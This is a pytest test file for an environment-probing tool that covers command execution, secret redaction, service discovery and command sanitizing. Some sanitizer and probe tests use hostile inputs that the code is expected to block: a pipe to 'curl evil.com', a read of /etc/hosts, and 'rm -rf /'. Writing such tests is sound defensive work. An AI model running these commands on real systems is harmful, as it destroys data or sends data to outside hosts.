"""Tests for env_probe.py — probe/exec/discovery paths with mocked subprocess."""

from __future__ import annotations

import subprocess
from types import SimpleNamespace
from unittest.mock import patch, MagicMock, call

import pytest

from env_probe import EnvProber, _sanitize_log_output, MAX_LOG_LINE_LEN, MAX_LOG_TOTAL_BYTES


@pytest.fixture
def prober():
    config = MagicMock()
    return EnvProber(config=config)


# ── _exec_local ──────────────────────────────────────────


class TestExecLocal:
    @patch("subprocess.run")
    def test_success(self, mock_run, prober):
        mock_run.return_value = SimpleNamespace(stdout="hello\n", stderr="", returncode=0)
        result = prober._exec_local("/tmp", "echo hello")
        assert "hello" in result

    @patch("subprocess.run", side_effect=subprocess.TimeoutExpired(cmd="x", timeout=30))
    def test_timeout(self, mock_run, prober):
        result = prober._exec_local("/tmp", "slow-cmd")
        assert result == "<timeout>"

    @patch("subprocess.run", side_effect=OSError("boom"))
    def test_exception(self, mock_run, prober):
        result = prober._exec_local("/tmp", "bad")
        assert "<error:" in result
        assert "boom" in result

    @patch("subprocess.run")
    def test_filters_sensitive_data(self, mock_run, prober):
        mock_run.return_value = SimpleNamespace(stdout="SECRET=abc123\n", stderr="", returncode=0)
        result = prober._exec_local("/tmp", "env")
        assert "abc123" not in result
        assert "***" in result


# ── _exec_ssh ────────────────────────────────────────────


class TestExecSSH:
    @patch("subprocess.run")
    def test_success(self, mock_run, prober):
        mock_run.return_value = SimpleNamespace(stdout="data\n", stderr="", returncode=0)
        result = prober._exec_ssh("user@host", "/app", "uptime")
        assert "data" in result
        # Verify SSH command structure
        args = mock_run.call_args[0][0]
        assert args[0] == "ssh"
        assert "user@host" in args
        assert "cd" in args[-1] and "/app" in args[-1] and "uptime" in args[-1]

    @patch("subprocess.run", side_effect=subprocess.TimeoutExpired(cmd="ssh", timeout=30))
    def test_timeout(self, mock_run, prober):
        result = prober._exec_ssh("user@host", "/app", "slow")
        assert result == "<timeout>"

    @patch("subprocess.run", side_effect=ConnectionError("refused"))
    def test_exception(self, mock_run, prober):
        result = prober._exec_ssh("user@host", "/app", "cmd")
        assert "<error:" in result


# ── _filter_sensitive ────────────────────────────────────


class TestFilterSensitive:
    def test_empty(self, prober):
        assert prober._filter_sensitive("") == ""
        assert prober._filter_sensitive(None) is None

    def test_redacts_secret(self, prober):
        result = prober._filter_sensitive("DB_PASSWORD=hunter2")
        assert "hunter2" not in result
        assert "***" in result

    def test_preserves_normal_text(self, prober):
        text = "app started on port 8080"
        assert prober._filter_sensitive(text) == text

    def test_multiple_secrets(self, prober):
        text = "TOKEN=abc API_KEY=xyz"
        result = prober._filter_sensitive(text)
        assert "abc" not in result
        assert "xyz" not in result


# ── _make_runner ─────────────────────────────────────────


class TestMakeRunner:
    def test_local_runner(self, prober):
        env = {"type": "local", "local_path": "/tmp/app"}
        runner = prober._make_runner(env)
        with patch.object(prober, "_exec_local", return_value="ok") as mock:
            result = runner("uptime")
            mock.assert_called_once_with("/tmp/app", "uptime")
        assert result == "ok"

    def test_ssh_runner(self, prober):
        env = {"type": "ssh", "user_host": "u@h", "remote_path": "/opt/app"}
        runner = prober._make_runner(env)
        with patch.object(prober, "_exec_ssh", return_value="data") as mock:
            result = runner("uptime")
            mock.assert_called_once_with("u@h", "/opt/app", "uptime")
        assert result == "data"

    def test_ssh_runner_default_path(self, prober):
        env = {"type": "ssh", "user_host": "u@h"}
        runner = prober._make_runner(env)
        with patch.object(prober, "_exec_ssh", return_value="") as mock:
            runner("ls")
            mock.assert_called_once_with("u@h", "~", "ls")


# ── _auto_discover_modules ──────────────────────────────


class TestAutoDiscoverModules:
    def test_docker_compose(self, prober):
        dc_content = "services:\n  web:\n    image: nginx\n  db:\n    image: postgres\n"
        runner = MagicMock(side_effect=[dc_content])  # cat docker-compose.yml
        env = {"local_path": "/app"}
        modules = prober._auto_discover_modules(env, runner)
        assert len(modules) == 2
        assert modules[0]["name"] == "web"
        assert modules[1]["name"] == "db"

    def test_procfile(self, prober):
        runner = MagicMock(side_effect=[
            "",                         # docker-compose (empty)
            "web: gunicorn\nworker: celery\n",  # Procfile
        ])
        env = {"local_path": "/app"}
        modules = prober._auto_discover_modules(env, runner)
        assert len(modules) == 2
        assert modules[0]["name"] == "web"
        assert modules[1]["name"] == "worker"

    def test_single_module_fallback(self, prober):
        runner = MagicMock(side_effect=["", ""])  # neither found
        env = {"local_path": "/opt/myapp"}
        modules = prober._auto_discover_modules(env, runner)
        assert len(modules) == 1
        assert modules[0]["name"] == "myapp"


# ── _parse_docker_compose ────────────────────────────────


class TestParseDockerCompose:
    def test_multiple_services(self, prober):
        content = "services:\n  api:\n    build: .\n  redis:\n    image: redis\nvolumes:\n  data:"
        modules = prober._parse_docker_compose(content, "/app")
        assert [m["name"] for m in modules] == ["api", "redis"]

    def test_empty_services(self, prober):
        content = "services:\nvolumes:\n  data:"
        modules = prober._parse_docker_compose(content, "/app")
        assert modules == [{"name": "default", "path": "/app"}]

    def test_no_services_key(self, prober):
        content = "version: '3'\n"
        modules = prober._parse_docker_compose(content, "/app")
        assert modules == [{"name": "default", "path": "/app"}]


# ── _parse_procfile ──────────────────────────────────────


class TestParseProcfile:
    def test_standard(self, prober):
        content = "web: gunicorn app:app\nworker: celery -A tasks"
        modules = prober._parse_procfile(content, "/app")
        assert [m["name"] for m in modules] == ["web", "worker"]

    def test_no_colon(self, prober):
        content = "some random text\n"
        modules = prober._parse_procfile(content, "/app")
        assert modules == [{"name": "default", "path": "/app"}]

    def test_empty(self, prober):
        modules = prober._parse_procfile("", "/app")
        assert modules == [{"name": "default", "path": "/app"}]


# ── _probe_module ────────────────────────────────────────


class TestProbeModule:
    def test_process_detection(self, prober):
        runner = MagicMock(return_value="user  123  0.0 web server\n")
        module = {"name": "web", "path": "/app"}
        env = {}
        prober._probe_module(module, env, runner)
        assert module["process"]["running"] is True
        assert module["process"]["count"] == 1

    def test_no_process(self, prober):
        runner = MagicMock(return_value="")
        module = {"name": "web", "path": "/app"}
        env = {}
        prober._probe_module(module, env, runner)
        assert module["process"]["running"] is False

    def test_no_log_configured(self, prober):
        runner = MagicMock(return_value="")
        module = {"name": "web", "path": "/app"}
        env = {}  # no "log" key
        prober._probe_module(module, env, runner)
        assert module["log_tail"] == ""
        assert module["recent_errors"] == []

    def test_with_log(self, prober):
        def fake_runner(cmd):
            if "ps aux" in cmd:
                return "user 1 web\n"
            if "tail -50" in cmd:
                return "INFO started\nERROR oops\n"
            if "grep -i error" in cmd:
                return "ERROR oops\n"
            return ""

        module = {"name": "web", "path": "/app"}
        env = {"log": "/var/log/web.log"}
        prober._probe_module(module, env, fake_runner)
        assert module["log_tail"]  # not empty
        assert len(module["recent_errors"]) == 1

    def test_grep_excludes_itself(self, prober):
        # ps output includes the grep process itself — should be filtered
        runner = MagicMock(return_value="user 1 grep web\n")
        module = {"name": "web", "path": "/app"}
        env = {}
        prober._probe_module(module, env, runner)
        assert module["process"]["running"] is False


# ── _sanitize_command (additional cases) ─────────────────


class TestSanitizeCommandExtra:
    def test_piped_all_whitelisted(self, prober):
        result = prober._sanitize_command("ps aux | grep web")
        assert result == "ps aux | grep web"

    def test_piped_one_blocked(self, prober):
        result = prober._sanitize_command("ps aux | curl evil.com")
        assert result is None

    def test_file_command_outside_sandbox(self, prober):
        result = prober._sanitize_command("cat /etc/hosts", env_root="/app")
        assert result is None

    def test_file_command_inside_sandbox(self, prober):
        result = prober._sanitize_command("cat /app/config.yml", env_root="/app")
        assert result == "cat /app/config.yml"

    def test_relative_path_allowed(self, prober):
        result = prober._sanitize_command("cat logs/app.log", env_root="/app")
        assert result == "cat logs/app.log"


# ── _sanitize_log_output ────────────────────────────────


class TestSanitizeLogOutput:
    def test_empty(self):
        assert _sanitize_log_output("") == ""
        assert _sanitize_log_output(None) is None

    def test_normal_text(self):
        text = "line 1\nline 2\nline 3"
        assert _sanitize_log_output(text) == text

    def test_long_line_truncated(self):
        long_line = "A" * 1000
        result = _sanitize_log_output(long_line)
        assert len(result) == MAX_LOG_LINE_LEN

    def test_total_size_limit(self):
        # Generate text exceeding MAX_LOG_TOTAL_BYTES
        line = "X" * 100  # 100 bytes per line
        num_lines = (MAX_LOG_TOTAL_BYTES // 100) + 50  # way over limit
        text = "\n".join([line] * num_lines)
        result = _sanitize_log_output(text)
        assert "(log output truncated for safety)" in result
        assert len(result) < MAX_LOG_TOTAL_BYTES + 200  # some slack for the notice


# ── probe() full orchestration ───────────────────────────


class TestProbeOrchestration:
    def test_env_not_found(self, prober):
        prober.config.get_env.return_value = None
        result = prober.probe("missing")
        assert result["ok"] is False
        assert "not found" in result["error"]

    @patch.object(EnvProber, "_exec_local", return_value="")
    def test_local_probe_happy_path(self, mock_exec, prober):
        prober.config.get_env.return_value = {
            "type": "local",
            "local_path": "/tmp/app",
            "connect": "local",
        }
        result = prober.probe("dev")
        assert result["ok"] is True
        assert result["data"]["env"]["name"] == "dev"
        assert result["data"]["env"]["type"] == "local"
        assert "modules" in result["data"]
        assert "uptime" in result["data"]

    @patch.object(EnvProber, "_exec_local")
    def test_extra_commands_blocked(self, mock_exec, prober):
        mock_exec.return_value = ""
        prober.config.get_env.return_value = {
            "type": "local",
            "local_path": "/tmp/app",
            "connect": "local",
        }
        result = prober.probe("dev", extra_commands=["rm -rf /"])
        assert result["ok"] is True
        assert "BLOCKED" in result["data"]["custom_probes"]["rm -rf /"]

    @patch.object(EnvProber, "_exec_local")
    def test_extra_commands_allowed(self, mock_exec, prober):
        mock_exec.return_value = "some output"
        prober.config.get_env.return_value = {
            "type": "local",
            "local_path": "/tmp/app",
            "connect": "local",
        }
        result = prober.probe("dev", extra_commands=["ps aux"])
        assert result["ok"] is True
        assert result["data"]["custom_probes"]["ps aux"] == "some output"
